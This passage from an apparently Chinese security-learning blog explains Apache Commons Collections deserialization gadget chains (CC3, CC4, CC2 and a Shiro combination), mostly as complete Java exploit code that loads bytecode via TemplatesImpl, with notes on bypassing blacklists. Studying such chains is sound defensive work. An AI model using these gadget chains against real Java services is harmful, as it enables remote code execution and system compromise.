class_">HashMap</span>();<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">lazymap</span> <span class="hljs-operator">=</span> LazyMap.decorate(map, chainedTransformer);<br><br>        <span class="hljs-comment">//有参类实例化</span><br>        <span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>        <span class="hljs-type">Constructor</span> <span class="hljs-variable">annotationinvocationConstructor</span> <span class="hljs-operator">=</span> c.getDeclaredConstructor(Class.class, Map.class);<br>        annotationinvocationConstructor.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">InvocationHandler</span> <span class="hljs-variable">invocationhandler</span> <span class="hljs-operator">=</span> (InvocationHandler) annotationinvocationConstructor.newInstance(Target.class, lazymap);<br>        <span class="hljs-comment">//动态代理InvocationHandler</span><br>        <span class="hljs-type">Map</span> <span class="hljs-variable">proxymap</span> <span class="hljs-operator">=</span> (Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(), <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Map.class&#125;, invocationhandler);<br>        <span class="hljs-comment">//</span><br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> annotationinvocationConstructor.newInstance(Target.class, proxymap);<br><br>        serialize.serialize(o);<br>        unserialze.unserialize(<span class="hljs-string">&quot;ser.bin&quot;</span>);<br><br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>其实就是修改了cc1的命令执行，使用<code>defineClass.newInstance</code>的方式代替<code>Runtime.exec</code>,这种情况就适合用于当exec被黑名单过滤</p><h4 id="使用InstantiateTransformer代替InvokerTransformer"><a href="#使用InstantiateTransformer代替InvokerTransformer" class="headerlink" title="使用InstantiateTransformer代替InvokerTransformer"></a>使用<code>InstantiateTransformer</code>代替<code>InvokerTransformer</code></h4><p>当InvokerTransformer被黑名单禁用时，我们需要去找替代的方法</p><p>我们知道从<code>newTransformer</code>中可以进行代码执行，寻找调用<code>newTransformer</code>的方法</p><p><img src="/image/cc%E9%93%BE/image-20240429130216191.png" alt="image-20240429130216191"> </p><p>这个<code>TrAXFilter</code>没有继承序列化接口，所以需要像runtime一样操作他的class，进行序列化操作</p><p>由于我们需要对他进行传参，所以需要利用构造函数，作者使用了<code>InstantiateTransformer</code>来调用构造函数</p><p>在<code>InstantiateTransformer</code>中，首先判断传入的class是否为空，不为空则会调用类的<code>newInstance</code>方法</p><p><img src="/image/cc%E9%93%BE/image-20240429125306004.png" alt="image-20240429125306004"> </p><p>完整代码如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><code class="hljs java"><br><span class="hljs-keyword">package</span> org.example;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InstantiateTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><br><span class="hljs-keyword">import</span> javax.xml.transform.Templates;<br><span class="hljs-keyword">import</span> java.lang.annotation.Target;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationHandler;<br><span class="hljs-keyword">import</span> java.lang.reflect.Proxy;<br><span class="hljs-keyword">import</span> java.nio.file.Files;<br><span class="hljs-keyword">import</span> java.nio.file.Paths;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CC3</span> &#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        Class&lt;? <span class="hljs-keyword">extends</span> <span class="hljs-title class_">TemplatesImpl</span>&gt; tClass = templates.getClass();<br>        <span class="hljs-comment">//反射为name赋值</span><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">nameField</span> <span class="hljs-operator">=</span> tClass.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);<br>        nameField.setAccessible(<span class="hljs-literal">true</span>);<br>        nameField.set(templates,<span class="hljs-string">&quot;asd&quot;</span>);<br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">bytecodesField</span> <span class="hljs-operator">=</span> tClass.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);<br>        bytecodesField.setAccessible(<span class="hljs-literal">true</span>);<br><br>        <span class="hljs-type">byte</span>[] bytes = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;C:\\Users\\40148\\Desktop\\笔记\\CC链\\calc.class&quot;</span>));<br>        <span class="hljs-type">byte</span>[][] code=&#123;bytes&#125;;<br>        bytecodesField.set(templates,code);<br><br><br>        <span class="hljs-comment">//使用代替InvokerTransformer</span><br>        <span class="hljs-type">InstantiateTransformer</span> <span class="hljs-variable">instantiateTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InstantiateTransformer</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Templates.class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;templates&#125;);<br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(TrAXFilter.class),<br>                instantiateTransformer<br>        &#125;;<br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br><br><br><br>        <span class="hljs-type">HashMap</span> <span class="hljs-variable">map</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">lazymap</span> <span class="hljs-operator">=</span> LazyMap.decorate(map, chainedTransformer);<br><br>        <span class="hljs-comment">//有参类实例化</span><br>        <span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>        <span class="hljs-type">Constructor</span> <span class="hljs-variable">annotationinvocationConstructor</span> <span class="hljs-operator">=</span> c.getDeclaredConstructor(Class.class, Map.class);<br>        annotationinvocationConstructor.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">InvocationHandler</span> <span class="hljs-variable">invocationhandler</span> <span class="hljs-operator">=</span> (InvocationHandler) annotationinvocationConstructor.newInstance(Target.class, lazymap);<br>        <span class="hljs-comment">//动态代理InvocationHandler</span><br>        <span class="hljs-type">Map</span> <span class="hljs-variable">proxymap</span> <span class="hljs-operator">=</span> (Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(), <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Map.class&#125;, invocationhandler);<br>        <span class="hljs-comment">//</span><br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> annotationinvocationConstructor.newInstance(Target.class, proxymap);<br><br>        serialize.serialize(o);<br>        unserialze.unserialize(<span class="hljs-string">&quot;ser.bin&quot;</span>);<br><br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><h3 id="具体执行流程"><a href="#具体执行流程" class="headerlink" title="具体执行流程"></a>具体执行流程</h3><p><img src="/image/cc%E9%93%BE/image-20240430103122882.png" alt="image-20240430103122882">  </p><h1 id="CC4"><a href="#CC4" class="headerlink" title="CC4"></a>CC4</h1><h3 id="导入cc4依赖"><a href="#导入cc4依赖" class="headerlink" title="导入cc4依赖"></a>导入cc4依赖</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.commons<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>commons-collections4<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>4.0<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><h3 id="寻找调用链-1"><a href="#寻找调用链-1" class="headerlink" title="寻找调用链"></a>寻找调用链</h3><p>从<code>ChainedTransformer</code>的<code>Transform</code>入手，查看在cc4中使用改方法的地方</p><p>在<code>TransformingComparator.compare</code>中调用了<code>ChainedTransformer</code>的<code>Transform</code></p><p><img src="/image/cc%E9%93%BE/image-20240430112024475.png" alt="image-20240430112024475"> </p><p>接下来寻找哪里调用了<code>TransformingComparator.compare</code></p><p>而在<code>PriorityQueue.readObject </code>中调用了<code>heapify</code>,继续根进</p><p><img src="/image/cc%E9%93%BE/image-20240430112251405.png" alt="image-20240430112251405"> </p><p>调用了siftdown，继续跟进</p><p><img src="/image/cc%E9%93%BE/image-20240430112423972.png" alt="image-20240430112423972"> </p><p><img src="/image/cc%E9%93%BE/image-20240430112502028.png" alt="image-20240430112502028"> </p><p>跟进<code>siftDownUsingComparator</code>,找到<code>compare</code>方法，而<code>comparator</code> 是可以被控制的，可以控制为<code>TransformingComparator </code></p><p><img src="/image/cc%E9%93%BE/image-20240430112524539.png" alt="image-20240430112524539"> </p><h3 id="构造调用链"><a href="#构造调用链" class="headerlink" title="构造调用链"></a>构造调用链</h3><p>前半部分可以选择使用invoke也可以使用defineClass进行，与CC1，CC3一致</p><p>主要不同在于对<code>chainedTransformer.transform()</code>的调用</p><p>这里我们需要利用<code>TransformingComparator.compare</code>来调用<code>chainedTransformer.transform()</code>，</p><p>而要调用<code>TransformingComparator.compare</code>则需要利用优先队列<code>PriorityQueue</code>的readObject方法</p><p>初步代码如下</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs abnf">TransformingComparator transformingComparator <span class="hljs-operator">=</span> new TransformingComparator&lt;&gt;(chainedTransformer)<span class="hljs-comment">;</span><br>PriorityQueue priorityQueue <span class="hljs-operator">=</span> new PriorityQueue(transformingComparator)<span class="hljs-comment">;</span><br><br>serialize.serialize(priorityQueue)<span class="hljs-comment">;</span><br>unserialze.unserialize(<span class="hljs-string">&quot;ser.bin&quot;</span>)<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><p>可是运行后仍然无事发生</p><p>原因是在<code>heapify</code>中，因为队列成员不足两个，导致没有进入siftDown中</p><p><img src="/image/cc%E9%93%BE/image-20240430145844047.png" alt="image-20240430145844047"> </p><p>所以需要为队列加上俩个成员</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs abnf">TransformingComparator transformingComparator <span class="hljs-operator">=</span> new TransformingComparator&lt;&gt;(chainedTransformer)<span class="hljs-comment">;</span><br><br>       PriorityQueue priorityQueue <span class="hljs-operator">=</span> new PriorityQueue(transformingComparator)<span class="hljs-comment">;</span><br>       priorityQueue.add(<span class="hljs-number">1</span>)<span class="hljs-comment">;</span><br>       priorityQueue.add(<span class="hljs-number">2</span>)<span class="hljs-comment">;</span><br><br>       serialize.serialize(priorityQueue)<span class="hljs-comment">;</span><br>       unserialze.unserialize(<span class="hljs-string">&quot;ser.bin&quot;</span>)<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><p>这样会出现新的报错，原因和CC3一样，在add时会调用利用链，但是_Factory又没赋值。</p><p>所以会出现报错，解决方法也一样，一开始将chainedTransformer赋值一个无关的变量，add以后改回来即可</p><h3 id="完整exp如下"><a href="#完整exp如下" class="headerlink" title="完整exp如下"></a>完整exp如下</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span>  Exception&#123;<br><br>       <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>       Class&lt;? <span class="hljs-keyword">extends</span> <span class="hljs-title class_">TemplatesImpl</span>&gt; tClass = templates.getClass();<br>       <span class="hljs-comment">//反射为name赋值</span><br>       <span class="hljs-type">Field</span> <span class="hljs-variable">nameField</span> <span class="hljs-operator">=</span> tClass.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);<br>       nameField.setAccessible(<span class="hljs-literal">true</span>);<br>       nameField.set(templates,<span class="hljs-string">&quot;asd&quot;</span>);<br><br><br>       <span class="hljs-type">Field</span> <span class="hljs-variable">bytecodesField</span> <span class="hljs-operator">=</span> tClass.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);<br>       bytecodesField.setAccessible(<span class="hljs-literal">true</span>);<br><br>       <span class="hljs-type">byte</span>[] bytes = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;C:\\Users\\40148\\Desktop\\笔记\\CC链\\calc.class&quot;</span>));<br>       <span class="hljs-type">byte</span>[][] code=&#123;bytes&#125;;<br>       bytecodesField.set(templates,code);<br>       <span class="hljs-type">InstantiateTransformer</span> <span class="hljs-variable">instantiateTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InstantiateTransformer</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Templates.class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;templates&#125;);<br>       Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>               <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(TrAXFilter.class),<br>               instantiateTransformer<br>       &#125;;<br>       <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br><br>       <span class="hljs-type">TransformingComparator</span> <span class="hljs-variable">transformingComparator</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformingComparator</span>&lt;&gt;(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>&lt;&gt;(<span class="hljs-number">1</span>));<br><br>       <span class="hljs-type">PriorityQueue</span> <span class="hljs-variable">priorityQueue</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PriorityQueue</span>(transformingComparator);<br>       priorityQueue.add(<span class="hljs-number">1</span>);<br>       priorityQueue.add(<span class="hljs-number">2</span>);<br>       Class&lt;? <span class="hljs-keyword">extends</span> <span class="hljs-title class_">TransformingComparator</span>&gt; transformingComparatorClass = transformingComparator.getClass();<br>       <span class="hljs-type">Field</span> <span class="hljs-variable">transformingComparatorClassField</span> <span class="hljs-operator">=</span> transformingComparatorClass.getDeclaredField(<span class="hljs-string">&quot;transformer&quot;</span>);<br>       transformingComparatorClassField.setAccessible(<span class="hljs-literal">true</span>);<br>       transformingComparatorClassField.set(transformingComparator,chainedTransformer);<br><br>       serialize.serialize(priorityQueue);<br>       unserialze.unserialize(<span class="hljs-string">&quot;ser.bin&quot;</span>);<br><br>   &#125;<br></code></pre></td></tr></table></figure><h3 id="流程如下"><a href="#流程如下" class="headerlink" title="流程如下"></a>流程如下</h3><p><img src="/image/cc%E9%93%BE/image-20240430160608687.png" alt="image-20240430160608687"> </p><h1 id="CC2"><a href="#CC2" class="headerlink" title="CC2"></a>CC2</h1><p>在CC3时提到过，在<code>Templateslmol.newTransformer</code>中就可以进行代码执行操作，而<code>InvokeTransformer</code>可以反射调用任意方法，所以这里也可以使用<code>InvokeTransformer</code>进行反射调用<code>newTransformer</code></p><p>并且这条链可以不出现数组类<code>transformers</code></p><h3 id="完整代码如下"><a href="#完整代码如下" class="headerlink" title="完整代码如下"></a>完整代码如下</h3><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-built_in">public</span> static <span class="hljs-type">void</span> main(String[] args) throws <span class="hljs-keyword">Exception</span> &#123;<br>       TemplatesImpl templates = <span class="hljs-built_in">new</span> TemplatesImpl();<br>       <span class="hljs-keyword">Class</span>&lt;? extends TemplatesImpl&gt; tClass = templates.getClass();<br>       //反射为<span class="hljs-type">name</span>赋值<br>       Field nameField = tClass.getDeclaredField(&quot;_name&quot;);<br>       nameField.setAccessible(<span class="hljs-keyword">true</span>);<br>       nameField.<span class="hljs-keyword">set</span>(templates,&quot;asd&quot;);<br><br><br>       Field bytecodesField = tClass.getDeclaredField(&quot;_bytecodes&quot;);<br>       bytecodesField.setAccessible(<span class="hljs-keyword">true</span>);<br><br>       byte[] bytes = Files.readAllBytes(Paths.<span class="hljs-keyword">get</span>(&quot;C:\\Users\\40148\\Desktop\\笔记\\CC链\\calc.class&quot;));<br>       byte[][] code=&#123;bytes&#125;;<br>       bytecodesField.<span class="hljs-keyword">set</span>(templates,code);<br><br>       InvokerTransformer&lt;<span class="hljs-keyword">Object</span>, <span class="hljs-keyword">Object</span>&gt; invokerTransformer = <span class="hljs-built_in">new</span> InvokerTransformer&lt;&gt;(&quot;newTransformer&quot;, <span class="hljs-built_in">new</span> <span class="hljs-keyword">Class</span>[]&#123;&#125;, <span class="hljs-built_in">new</span> <span class="hljs-keyword">Object</span>[]&#123;&#125;);<br>       TransformingComparator&lt;<span class="hljs-keyword">Object</span>, <span class="hljs-keyword">Object</span>&gt; transformingComparator = <span class="hljs-built_in">new</span> TransformingComparator&lt;&gt;(<span class="hljs-built_in">new</span> ConstantTransformer&lt;&gt;(<span class="hljs-number">1</span>));<br>       PriorityQueue priorityQueue = <span class="hljs-built_in">new</span> PriorityQueue(transformingComparator);<br>       priorityQueue.<span class="hljs-keyword">add</span>(templates);<br>       priorityQueue.<span class="hljs-keyword">add</span>(<span class="hljs-number">2</span>);<br><br>       <span class="hljs-keyword">Class</span>&lt;? extends TransformingComparator&gt; transformingComparatorClass = transformingComparator.getClass();<br>       Field comparatorField = transformingComparatorClass.getDeclaredField(&quot;transformer&quot;);<br>       comparatorField.setAccessible(<span class="hljs-keyword">true</span>);<br>       comparatorField.<span class="hljs-keyword">set</span>(transformingComparator,invokerTransformer);<br><br>       serialize.serialize(priorityQueue);<br>       unserialze.unserialize(&quot;ser.bin&quot;);<br><br>   &#125;<br></code></pre></td></tr></table></figure><h3 id="流程如下-1"><a href="#流程如下-1" class="headerlink" title="流程如下"></a>流程如下</h3><p> <img src="/image/cc%E9%93%BE/image-20240507093241617.png" alt="image-20240507093241617"> </p><h1 id="shiroCC链-CC6-CC2-CC3"><a href="#shiroCC链-CC6-CC2-CC3" class="headerlink" title="shiroCC链(CC6+CC2+CC3)"></a>shiroCC链(CC6+CC2+CC3)</h1><h3 id="流程如下-2"><a href="#流程如下-2" class="headerlink" title="流程如下"></a>流程如下</h3><p><img src="/image/cc%E9%93%BE/image-20240507094858073.png" alt="image-20240507094858073"> </p><p>入口点为CC6，执行代码为CC3</p><p>利用<code>hashmap</code>得<code>readobject</code>触发<code>TideMapEntry</code>得hashcode，再调用<code>LazyMap</code>的<code>get</code>方法，再利用<code>invokeTransfoemer.transformer</code>反射调用<code>TemplatesImpl.newTransformer</code>最后走到dinfineclass进行类加载</p><h3 id="完整代码如下-1"><a href="#完整代码如下-1" class="headerlink" title="完整代码如下"></a>完整代码如下</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs java"><br><span class="hljs-comment">//CC3</span><br><span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>Class&lt;? <span class="hljs-keyword">extends</span> <span class="hljs-title class_">TemplatesImpl</span>&gt; tClass = templates.getClass();<br><span class="hljs-comment">//反射为name赋值</span><br><span class="hljs-type">Field</span> <span class="hljs-variable">nameField</span> <span class="hljs-operator">=</span> tClass.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);<br>nameField.setAccessible(<span class="hljs-literal">true</span>);<br>nameField.set(templates,<span class="hljs-string">&quot;asd&quot;</span>);<br><br><span class="hljs-type">Field</span> <span class="hljs-variable">bytecodesField</span> <span class="hljs-operator">=</span> tClass.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);<br>bytecodesField.setAccessible(<span class="hljs-literal">true</span>);<br><br><span class="hljs-type">byte</span>[] bytes = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;C:\\Users\\40148\\Desktop\\笔记\\CC链\\calc.class&quot;</span>));<br><span class="hljs-type">byte</span>[][] code=&#123;bytes&#125;;<br>bytecodesField.set(templates,code);<br><br><span class="hljs-comment">//CC2</span><br><span class="hljs-type">InvokerTransformer</span> <span class="hljs-variable">invokerTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;newTransformer&quot;</span>, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>);<br><br><span class="hljs-comment">//CC6</span><br><span class="hljs-type">HashMap</span> <span class="hljs-variable">map</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br><span class="hljs-comment">//先给lazymap一个无用的Transformer</span><br><span class="hljs-type">Map</span> <span class="hljs-variable">lazymap</span> <span class="hljs-operator">=</span> LazyMap.decorate(map, <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(<span class="hljs-number">1</span>));<br><br><span class="hljs-type">TiedMapEntry</span> <span class="hljs-variable">tiedMapEntry</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TiedMapEntry</span>(lazymap,templates);<br><br>HashMap&lt;Object, Object&gt; map2 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>map2.put(tiedMapEntry,<span class="hljs-string">&quot;123&quot;</span>);<br>lazymap.remove(templates);<br><span class="hljs-comment">//解决put问题，将无用的Transformer修改为chainedTransformer</span><br><span class="hljs-type">Class</span> <span class="hljs-variable">lazymapClass</span> <span class="hljs-operator">=</span> lazymap.getClass();<br><span class="hljs-type">Field</span> <span class="hljs-variable">factoryField</span> <span class="hljs-operator">=</span> lazymapClass.getDeclaredField(<span class="hljs-string">&quot;factory&quot;</span>);<br>factoryField.setAccessible(<span class="hljs-literal">true</span>);<br>factoryField.set(lazymap,invokerTransformer);<br><br>serialize.serialize(map2);<br>unserialze.unserialize(<span class="hljs-string">&quot;ser.bin&quot;</span>); <br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
